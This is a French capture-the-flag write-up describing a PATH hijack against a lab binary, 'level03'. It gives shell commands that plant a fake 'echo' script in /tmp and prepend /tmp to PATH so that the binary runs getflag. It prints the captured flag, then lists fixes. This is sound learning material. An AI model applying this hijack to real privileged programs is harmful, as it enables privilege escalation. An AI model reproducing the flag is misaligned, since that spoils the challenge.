# Rapport de Vulnérabilité : Hijacking de commande via modification de la variable d’environnement `$PATH`

## Description

Cette faille repose sur la redéfinition de la variable d’environnement `$PATH` afin de forcer l’exécution d’un faux binaire `echo`. Le programme `./level03` exécute la commande `echo` sans spécifier son chemin absolu. En plaçant un faux script `echo` dans un répertoire contrôlé (comme `/tmp`) et en modifiant `$PATH`, il est possible de détourner le comportement du programme pour exécuter une commande arbitraire, comme `getflag`.

## Comment Exploiter la Faille

### Étape 1 : Créer un faux script `echo`

```bash
echo -e '#!/bin/sh\n/bin/getflag' > /tmp/echo
chmod +x /tmp/echo
```

> Ce script exécute simplement `getflag` à la place de `echo`.

**Alternative pour test :**

```bash
echo -e '#!/bin/sh\necho pwned' > /tmp/echo
chmod +x /tmp/echo
```

### Étape 2 : Modifier le `$PATH`

Placer `/tmp` en tête du `PATH` pour forcer le programme à utiliser notre faux `echo` :

```bash
export PATH=/tmp:$PATH
```

### Étape 3 : Exécuter le binaire

```bash
./level03
```

Si le programme utilise `echo` sans chemin absolu, il exécutera `/tmp/echo`, déclenchant alors la commande `getflag`.

### Étape 4 : Récupération du flag

Le flag s'affiche directement après exécution :

```bash
getflag
```

**Flag obtenu :**

```
qi0maab88jeaj46qoumi7maus
```

---

## Comment Résoudre la Faille

Pour corriger cette vulnérabilité :

* **Utiliser des chemins absolus pour les commandes système** : `/bin/echo` au lieu de `echo`.
* **Restreindre les droits d'exécution** : Empêcher l'exécution de scripts placés dans des dossiers temporaires comme `/tmp`.

## Conclusion

Cette faille démontre les risques liés à l’utilisation non sécurisée des variables d’environnement dans les programmes. Une simple modification de `$PATH` permet de détourner des commandes système et d’exécuter des instructions arbitraires. Il est impératif de coder défensivement en utilisant des chemins absolus pour les appels système sensibles.

---
